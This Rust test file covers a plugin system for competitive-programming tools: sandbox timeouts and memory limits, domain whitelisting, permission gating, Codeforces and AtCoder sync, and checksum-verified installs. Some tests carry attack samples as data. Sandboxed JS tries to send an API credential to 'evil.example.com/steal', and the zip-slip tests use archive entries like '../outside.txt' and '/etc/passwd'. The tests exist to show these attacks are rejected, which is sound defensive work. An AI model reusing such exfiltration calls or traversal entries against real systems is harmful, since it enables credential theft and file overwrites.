use std::collections::BTreeMap;
use std::io::{Cursor, Write};
use std::sync::Arc;
use std::time::Duration;

use base64::Engine;

use crate::credentials::{CredentialStore, MemoryCredentialStore};
use crate::error::{PluginError, Result};
use crate::http::{HttpRequest, HttpResponse, MockHttpClient};
use crate::kv::KvStore;
use crate::manager::{
    PluginManager, PluginOrigin, RepoCatalog, RepoPluginEntry, ScaffoldKind, extract_zip_safe,
    init_plugin_scaffold, sha256_hex, test_plugin_dir,
};
use crate::manifest::{
    CommandContext, PluginCapability, PluginManifest, PluginPermissions, is_domain_allowed,
};
use crate::oj::{OjContext, OjPluginClient};
use crate::runtime::{HostContext, PluginRuntime, SandboxLimits};
use crate::workspace::{WorkspaceProblemDetail, WorkspaceProblemSummary, WorkspaceReader};

fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut writer = zip::ZipWriter::new(&mut buf);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            writer.start_file(*name, opts).unwrap();
            writer.write_all(content).unwrap();
        }
        writer.finish().unwrap();
    }
    buf.into_inner()
}

fn minimal_manifest(id: &str, domains: &[&str], workspace_read: bool) -> PluginManifest {
    PluginManifest {
        id: id.to_string(),
        name: format!("Test {id}"),
        version: "0.1.0".to_string(),
        description: String::new(),
        author: None,
        homepage: None,
        entry: "index.js".to_string(),
        ui_entry: None,
        capabilities: vec![PluginCapability::OjSource],
        permissions: PluginPermissions {
            domains: domains.iter().map(|s| s.to_string()).collect(),
            workspace_read,
        },
        credentials: Vec::new(),
        tools: Vec::new(),
        commands: Vec::new(),
        importers: Vec::new(),
        exporters: Vec::new(),
    }
}

fn ok_json(body: &str) -> Result<HttpResponse> {
    Ok(HttpResponse {
        status: 200,
        headers: BTreeMap::from([("content-type".to_string(), "application/json".to_string())]),
        body: body.to_string(),
    })
}

struct MockWorkspace {
    problems: Vec<WorkspaceProblemDetail>,
}

impl WorkspaceReader for MockWorkspace {
    fn list_problems(&self) -> Result<Vec<WorkspaceProblemSummary>> {
        Ok(self
            .problems
            .iter()
            .map(|p| WorkspaceProblemSummary {
                id: p.id.clone(),
                title: p.title.clone(),
                tags: p.tags.clone(),
                difficulty: p.difficulty.clone(),
            })
            .collect())
    }

    fn get_problem(&self, id: &str) -> Result<Option<WorkspaceProblemDetail>> {
        Ok(self.problems.iter().find(|p| p.id == id).cloned())
    }
}

#[test]
fn manifest_all_capabilities_and_permission_summary() {
    let toml_src = r#"
id = "full-featured"
name = "Full Featured Plugin"
version = "1.2.3"
description = "Tests all 5 capabilities and credentials"
entry = "index.js"
ui_entry = "ui.js"
capabilities = ["oj_source", "tool", "commands", "importer", "exporter", "credentials"]

[permissions]
domains = ["api.example.com", "*.sub.example.org"]
workspace_read = true

[[credentials]]
key = "api_token"
label = "API Token"
secret = true
required = true

[[tools]]
id = "calc"
name = "Calculator"

[[tools.inputs]]
name = "expr"
label = "Expression"
kind = "string"
required = true

[[commands]]
id = "open-calc"
title = "Open Calculator"
context = "problem"

[[importers]]
id = "fps"
name = "FPS XML"
extensions = [".xml"]

[[exporters]]
id = "domjudge"
name = "DOMjudge Package"
extension = ".zip"
"#;
    let m = PluginManifest::from_toml_str(toml_src).unwrap();
    assert_eq!(m.capabilities.len(), 6);
    assert!(m.has_capability(PluginCapability::OjSource));
    assert!(m.has_capability(PluginCapability::Tool));
    assert!(m.has_capability(PluginCapability::Commands));
    assert!(m.has_capability(PluginCapability::Importer));
    assert!(m.has_capability(PluginCapability::Exporter));
    assert!(m.has_capability(PluginCapability::Credentials));
    assert_eq!(m.commands[0].context, CommandContext::Problem);

    let summary = m.permission_summary();
    assert_eq!(summary.plugin_id, "full-featured");
    assert_eq!(
        summary.domains,
        vec!["api.example.com", "*.sub.example.org"]
    );
    assert_eq!(summary.credentials, vec!["api_token"]);
    assert!(summary.workspace_read);
    assert!(summary.has_unsandboxed_ui);

    // Domain matching edge cases
    assert!(is_domain_allowed(&m.permissions.domains, "API.EXAMPLE.COM"));
    assert!(is_domain_allowed(
        &m.permissions.domains,
        "a.sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "evil-example.com"
    ));

    // Reject path escape in entry
    let bad = r#"
id = "bad"
name = "Bad"
version = "1.0.0"
entry = "../escape.js"
"#;
    assert!(matches!(
        PluginManifest::from_toml_str(bad),
        Err(PluginError::ManifestInvalid(_))
    ));
}

#[test]
fn sandbox_enforces_timeout() {
    let manifest = minimal_manifest("looper", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits {
            timeout: Duration::from_millis(80),
            memory_limit_bytes: 16 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            spin() {
                while (true) {}
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "spin", &[], &host_ctx).unwrap_err();
    assert!(matches!(err, PluginError::Timeout { .. }), "got: {err:?}");
    assert_eq!(err.code(), "TIMEOUT");
}

#[test]
fn sandbox_enforces_memory_limit() {
    let manifest = minimal_manifest("oom", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits {
            timeout: Duration::from_secs(5),
            memory_limit_bytes: 2 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            blowUp() {
                const chunks = [];
                for (let i = 0; i < 1000; i++) {
                    chunks.push("x".repeat(1024 * 128));
                }
                return chunks.length;
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "blowUp", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::MemoryLimit { .. }),
        "expected MemoryLimit, got: {err:?}"
    );
    assert_eq!(err.code(), "MEMORY_LIMIT");
}

#[test]
fn sandbox_domain_whitelist_blocks_unauthorized_host_and_protects_credentials() {
    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        ok_json(&serde_json::json!({ "seen_auth": req.headers.get("Authorization") }).to_string())
    }));
    let creds = Arc::new(MemoryCredentialStore::new());
    creds.set("scoped", "api_key", "super-secret").unwrap();

    let manifest = minimal_manifest("scoped", &["allowed.example.com"], false);
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http.clone(),
        credentials: creds.clone(),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };

    let src = r#"
        module.exports = {
            callEvil() {
                return host.http.fetch({
                    url: "https://evil.example.com/steal",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
            },
            callAllowed() {
                const res = host.http.fetch({
                    url: "https://allowed.example.com/data",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
                return {
                    body: JSON.parse(res.body),
                    cred: host.credentials.get("api_key"),
                    hasFs: typeof fs !== "undefined",
                    hasProcess: typeof process !== "undefined",
                };
            }
        };
    "#;

    // Unauthorized domain must fail with DOMAIN_NOT_ALLOWED and never hit network
    let err = PluginRuntime::call_function(src, "callEvil", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::DomainNotAllowed { ref host, .. } if host == "evil.example.com"),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "DOMAIN_NOT_ALLOWED");
    assert!(mock_http.recorded_requests().is_empty());

    // Whitelisted domain succeeds and receives credential header
    let ok = PluginRuntime::call_function(src, "callAllowed", &[], &host_ctx).unwrap();
    assert_eq!(ok.value["body"]["seen_auth"], "Bearer super-secret");
    assert_eq!(ok.value["cred"], "super-secret");
    assert_eq!(ok.value["hasFs"], false);
    assert_eq!(ok.value["hasProcess"], false);
}

#[test]
fn sandbox_workspace_read_gating() {
    let ws = Arc::new(MockWorkspace {
        problems: vec![WorkspaceProblemDetail {
            id: "cf-1999a".into(),
            title: "A+B Again?".into(),
            tags: vec!["math".into()],
            difficulty: Some("800".into()),
            statement_md: Some("Compute sum of digits.".into()),
            editorial_md: None,
        }],
    });
    let src = r#"
        module.exports = {
            readAll() {
                const list = host.workspace.listProblems();
                const detail = host.workspace.getProblem("cf-1999a");
                return { list, detail };
            }
        };
    "#;

    // Denied when manifest.permissions.workspace_read == false
    let denied_ctx = HostContext {
        manifest: minimal_manifest("no-ws", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws.clone()),
        limits: SandboxLimits::default(),
    };
    let err = PluginRuntime::call_function(src, "readAll", &[], &denied_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::PermissionDenied { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "PERMISSION_DENIED");

    // Allowed when manifest.permissions.workspace_read == true
    let allowed_ctx = HostContext {
        manifest: minimal_manifest("with-ws", &[], true),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws),
        limits: SandboxLimits::default(),
    };
    let ok = PluginRuntime::call_function(src, "readAll", &[], &allowed_ctx).unwrap();
    assert_eq!(ok.value["list"].as_array().unwrap().len(), 1);
    assert_eq!(ok.value["detail"]["title"], "A+B Again?");
}

#[test]
fn host_kv_render_html_log_and_async_promise() {
    let dir = tempfile::tempdir().unwrap();
    let kv = Arc::new(KvStore::open(dir.path(), "demo").unwrap());
    let host_ctx = HostContext {
        manifest: minimal_manifest("demo", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: kv.clone(),
        workspace: None,
        limits: SandboxLimits::default(),
    };

    let src = r##"
        module.exports = {
            async run() {
                host.log("info", "starting");
                host.kv.set("cursor", 42);
                const c = host.kv.get("cursor");
                const nodes = host.html.select("<div><a href='/p/1'>Hello</a></div>", "a");
                const pngB64 = host.render.svgToPng(
                    '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><rect width="16" height="16" fill="#000"/></svg>',
                    1
                );
                return { cursor: c, linkText: nodes[0].text, linkHref: nodes[0].attrs.href, pngB64 };
            }
        };
    "##;

    let res = PluginRuntime::call_function(src, "run", &[], &host_ctx).unwrap();
    assert_eq!(res.value["cursor"], 42);
    assert_eq!(res.value["linkText"], "Hello");
    assert_eq!(res.value["linkHref"], "/p/1");
    assert_eq!(res.logs.len(), 1);
    assert_eq!(res.logs[0].level, "info");
    assert_eq!(res.logs[0].message, "starting");

    let png_bytes = base64::engine::general_purpose::STANDARD
        .decode(res.value["pngB64"].as_str().unwrap())
        .unwrap();
    assert_eq!(&png_bytes[..8], b"\x89PNG\r\n\x1a\n");

    // Verify atomic persistence on disk
    let reopened = KvStore::open(dir.path(), "demo").unwrap();
    assert_eq!(reopened.get("cursor").unwrap(), Some(serde_json::json!(42)));
}

#[test]
fn zip_slip_attack_is_rejected() {
    let tmp = tempfile::tempdir().unwrap();
    let malicious_zip = make_zip(&[("../outside.txt", b"pwned")]);
    let err = extract_zip_safe(&malicious_zip, tmp.path()).unwrap_err();
    assert!(matches!(err, PluginError::ZipSlip(_)), "got: {err:?}");
    assert_eq!(err.code(), "ZIP_SLIP");

    let abs_zip = make_zip(&[("/etc/passwd", b"nope")]);
    let err2 = extract_zip_safe(&abs_zip, tmp.path()).unwrap_err();
    assert!(matches!(err2, PluginError::ZipSlip(_)), "got: {err2:?}");

    let backslash_zip = make_zip(&[(r"..\..\evil.js", b"nope")]);
    let err3 = extract_zip_safe(&backslash_zip, tmp.path()).unwrap_err();
    assert!(matches!(err3, PluginError::ZipSlip(_)), "got: {err3:?}");
}

#[test]
fn builtin_codeforces_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("codeforces").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("/api/user.info") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "handle": "tourist",
                        "rating": 3800,
                        "maxRating": 4009,
                        "rank": "legendary grandmaster"
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.rating") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "contestId": 1999,
                        "contestName": "Codeforces Round 964 (Div. 4)",
                        "rank": 1,
                        "oldRating": 3750,
                        "newRating": 3800,
                        "ratingUpdateTimeSeconds": 1722960000
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.status") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2002,
                            "creationTimeSeconds": 1722961200,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "OK",
                            "problem": {
                                "contestId": 1999,
                                "index": "A",
                                "name": "A+B Again?",
                                "rating": 800,
                                "tags": ["implementation", "math"]
                            }
                        },
                        {
                            "id": 2001,
                            "creationTimeSeconds": 1722961000,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "WRONG_ANSWER",
                            "problem": {
                                "contestId": 1999,
                                "index": "B",
                                "name": "Card Game",
                                "rating": 1000,
                                "tags": ["games"]
                            }
                        }
                    ]
                }"#,
            )
        } else if req.url.contains("/api/contest.list") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2050,
                            "name": "Codeforces Round 990",
                            "type": "CF",
                            "phase": "BEFORE",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1735000000
                        },
                        {
                            "id": 1900,
                            "name": "Old Round",
                            "type": "CF",
                            "phase": "FINISHED",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1700000000
                        }
                    ]
                }"#,
            )
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "tourist".into(),
    };

    let v = client.verify(&oj_ctx).unwrap();
    assert!(v.ok);
    assert_eq!(v.handle.as_deref(), Some("tourist"));

    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(3800));
    assert_eq!(acct.max_rating, Some(4009));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "1999");

    // Initial submission sync
    let batch1 = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch1.submissions.len(), 2);
    assert_eq!(batch1.submissions[0].verdict, "AC");
    assert_eq!(batch1.submissions[0].problem_key, "1999A");
    assert_eq!(batch1.submissions[1].verdict, "WA");
    assert_eq!(batch1.next_cursor.as_deref(), Some("2002"));

    // Incremental sync with cursor "2001" only returns submission 2002
    let batch2 = client.sync_submissions(&oj_ctx, Some("2001")).unwrap();
    assert_eq!(batch2.submissions.len(), 1);
    assert_eq!(batch2.submissions[0].submission_id, "2002");

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "2050");

    assert_eq!(client.normalize_rating(1650.0).unwrap(), Some(1650));

    let p1 = client
        .parse_problem_url("https://codeforces.com/problemset/problem/1999/A")
        .unwrap()
        .unwrap();
    assert_eq!(p1.problem_id, "1999A");
    let p2 = client
        .parse_problem_url("https://codeforces.com/contest/1999/problem/B")
        .unwrap()
        .unwrap();
    assert_eq!(p2.problem_id, "1999B");
    let p3 = client
        .parse_problem_url("https://codeforces.com/gym/100001/problem/C")
        .unwrap()
        .unwrap();
    assert_eq!(p3.problem_id, "100001C");
    assert!(
        client
            .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_a")
            .unwrap()
            .is_none()
    );
}

#[test]
fn builtin_atcoder_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("atcoder").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("atcoder.jp/users/chokudai/history/json") {
            ok_json(
                r#"[
                    {
                        "IsRated": true,
                        "Place": 10,
                        "OldRating": 2700,
                        "NewRating": 2850,
                        "ContestName": "AtCoder Beginner Contest 350",
                        "ContestScreenName": "abc350.contest.atcoder.jp",
                        "EndTime": "2024-04-20T22:40:00+09:00",
                        "ContestType": 0
                    },
                    {
                        "IsRated": true,
                        "Place": 1,
                        "OldRating": 2000,
                        "NewRating": 2200,
                        "ContestName": "AtCoder Heuristic Contest 032",
                        "ContestScreenName": "ahc032.contest.atcoder.jp",
                        "EndTime": "2024-04-21T22:40:00+09:00",
                        "ContestType": 1
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/atcoder-api/v3/user/submissions")
        {
            ok_json(
                r#"[
                    {
                        "id": 50001,
                        "epoch_second": 1713615000,
                        "problem_id": "abc350_d",
                        "contest_id": "abc350",
                        "user_id": "chokudai",
                        "language": "C++ 20 (gcc 12.2)",
                        "result": "AC"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problems.json")
        {
            ok_json(
                r#"[
                    {
                        "id": "abc350_d",
                        "contest_id": "abc350",
                        "problem_index": "D",
                        "name": "New Friends",
                        "title": "D. New Friends"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problem-models.json")
        {
            ok_json(r#"{ "abc350_d": { "difficulty": 1200 } }"#)
        } else if req.url == "https://atcoder.jp/contests/" {
            Ok(HttpResponse {
                status: 200,
                headers: BTreeMap::new(),
                body: r##"
                    <html><body>
                      <div id="contest-table-upcoming">
                        <table><tbody>
                          <tr>
                            <td><a href="#">2026-12-01 21:00:00+0900</a></td>
                            <td><a href="/contests/abc400">AtCoder Beginner Contest 400</a></td>
                            <td>01:40</td>
                          </tr>
                        </tbody></table>
                      </div>
                    </body></html>
                "##
                .to_string(),
            })
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "chokudai".into(),
    };

    assert!(client.verify(&oj_ctx).unwrap().ok);

    // Heuristic contest (ContestType == 1 / ahc032) must be excluded!
    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(2850));
    assert_eq!(acct.max_rating, Some(2850));
    assert_eq!(acct.rank.as_deref(), Some("red"));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "abc350");

    let batch = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch.submissions.len(), 1);
    assert_eq!(batch.submissions[0].problem_key, "abc350_d");
    assert_eq!(batch.submissions[0].problem_title, "D. New Friends");
    assert_eq!(batch.submissions[0].raw_rating, Some(1200.0));
    assert_eq!(batch.submissions[0].normalized_rating, Some(1760));
    assert_eq!(batch.next_cursor.as_deref(), Some("1713615001"));

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "abc400");
    assert_eq!(contests[0].duration_sec, 6000);

    let r_low = client.normalize_rating(0.0).unwrap().unwrap();
    let r_mid = client.normalize_rating(1200.0).unwrap().unwrap();
    let r_high = client.normalize_rating(2400.0).unwrap().unwrap();
    assert!(r_low < r_mid && r_mid < r_high);

    let parsed = client
        .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_d")
        .unwrap()
        .unwrap();
    assert_eq!(parsed.platform, "atcoder");
    assert_eq!(parsed.contest_id.as_deref(), Some("abc350"));
    assert_eq!(parsed.problem_id, "abc350_d");
    assert_eq!(parsed.problem_index.as_deref(), Some("D"));
}

#[test]
fn lightweight_oj_plugin_sync_summary() {
    let manifest = minimal_manifest("luogu-lite", &["www.luogu.com.cn"], false);
    let mock_http = Arc::new(MockHttpClient::new(|_req| {
        ok_json(r#"{ "passed": 321, "submitted": 654, "problems": ["P1001", "P1002"] }"#)
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            syncSummary(ctx) {
                const r = host.http.fetch({ url: "https://www.luogu.com.cn/user/" + ctx.handle });
                const d = JSON.parse(r.body);
                return {
                    handle: ctx.handle,
                    solved_count: d.passed,
                    submission_count: d.submitted,
                    solved_problem_keys: d.problems,
                };
            }
        };
    "#;
    let client = OjPluginClient::new(src, &host_ctx);
    let summary = client
        .sync_summary(&OjContext {
            handle: "12345".into(),
        })
        .unwrap();
    assert_eq!(summary.solved_count, 321);
    assert_eq!(summary.submission_count, Some(654));
    assert_eq!(summary.solved_problem_keys, vec!["P1001", "P1002"]);
}

#[test]
fn manager_builtin_override_state_and_repo_sha256() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // Export built-in copy -> becomes LocalOverride
    let exported = mgr.export_builtin_copy("codeforces").unwrap();
    assert!(exported.join("manifest.toml").is_file());
    let list = mgr.list_plugins().unwrap();
    let cf = list.iter().find(|p| p.manifest.id == "codeforces").unwrap();
    assert_eq!(cf.origin, PluginOrigin::LocalOverride);

    // Disable & record error persist across reads
    mgr.set_enabled("codeforces", false).unwrap();
    mgr.record_error("codeforces", "rate limited").unwrap();
    let cf2 = mgr
        .list_plugins()
        .unwrap()
        .into_iter()
        .find(|p| p.manifest.id == "codeforces")
        .unwrap();
    assert!(!cf2.enabled);
    assert_eq!(cf2.last_error.as_deref(), Some("rate limited"));
    mgr.clear_error("codeforces").unwrap();

    // Build a valid community plugin ZIP inside a top-level folder
    let community_zip = make_zip(&[
        (
            "vjudge-plugin/manifest.toml",
            br#"
id = "vjudge"
name = "VJudge"
version = "0.2.0"
entry = "index.js"
capabilities = ["oj_source"]
"#,
        ),
        (
            "vjudge-plugin/index.js",
            b"module.exports = { verify(ctx) { return { ok: true, handle: ctx.handle }; } };",
        ),
    ]);
    let good_sha = sha256_hex(&community_zip);
    let catalog = RepoCatalog {
        name: "Community Repo".into(),
        plugins: vec![RepoPluginEntry {
            id: "vjudge".into(),
            name: "VJudge".into(),
            version: "0.2.0".into(),
            description: "VJudge plugin".into(),
            download_url: "https://repo.example.com/vjudge.zip".into(),
            sha256: good_sha.clone(),
            permissions: None,
        }],
    };
    let catalog_json = serde_json::to_string(&catalog).unwrap();
    let zip_clone = community_zip.clone();
    let mock_http = MockHttpClient::new(move |req| {
        if req.url == "https://repo.example.com/index.json" {
            ok_json(&catalog_json)
        } else {
            panic!("unexpected url {}", req.url);
        }
    })
    .with_bytes_handler(move |url| {
        if url == "https://repo.example.com/vjudge.zip" {
            Ok(zip_clone.clone())
        } else {
            panic!("unexpected download url {url}");
        }
    });

    mgr.add_repo(
        "https://repo.example.com/index.json",
        Some("Community".into()),
    )
    .unwrap();
    assert_eq!(mgr.list_repos().unwrap().len(), 1);

    let fetched = mgr
        .fetch_repo_catalog("https://repo.example.com/index.json", &mock_http)
        .unwrap();
    assert_eq!(fetched.plugins.len(), 1);

    // Mismatched SHA-256 must be rejected
    let mut bad_entry = fetched.plugins[0].clone();
    bad_entry.sha256 = "0".repeat(64);
    let err = mgr
        .install_from_repo_entry(&bad_entry, &mock_http)
        .unwrap_err();
    assert!(
        matches!(err, PluginError::ChecksumMismatch { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "CHECKSUM_MISMATCH");

    // Matching SHA-256 installs cleanly
    let installed = mgr
        .install_from_repo_entry(&fetched.plugins[0], &mock_http)
        .unwrap();
    assert_eq!(installed.manifest.id, "vjudge");
    assert_eq!(installed.origin, PluginOrigin::Local);

    assert!(
        mgr.remove_repo("https://repo.example.com/index.json")
            .unwrap()
    );
    assert!(mgr.list_repos().unwrap().is_empty());
}

#[test]
fn scaffold_and_test_plugin_dir() {
    let tmp = tempfile::tempdir().unwrap();
    let tool_dir = tmp.path().join("my-tool");
    init_plugin_scaffold(&tool_dir, ScaffoldKind::Tool).unwrap();
    assert!(tool_dir.join("manifest.toml").is_file());
    assert!(tool_dir.join("index.js").is_file());
    assert!(tool_dir.join("xcpc-plugin.d.ts").is_file());

    let report = test_plugin_dir(
        &tool_dir,
        "runTool",
        r#"["hello", { "text": "XCPC" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(report.plugin_id, "my-tool");
    assert_eq!(report.action, "runTool");
    assert_eq!(report.result["blocks"][0]["content"], "Hello, XCPC!");

    let oj_dir = tmp.path().join("my-oj");
    init_plugin_scaffold(&oj_dir, ScaffoldKind::Oj).unwrap();
    let oj_report = test_plugin_dir(
        &oj_dir,
        "verify",
        r#"[{ "handle": "alice" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(oj_report.result["ok"], true);
    assert_eq!(oj_report.result["handle"], "alice");
}
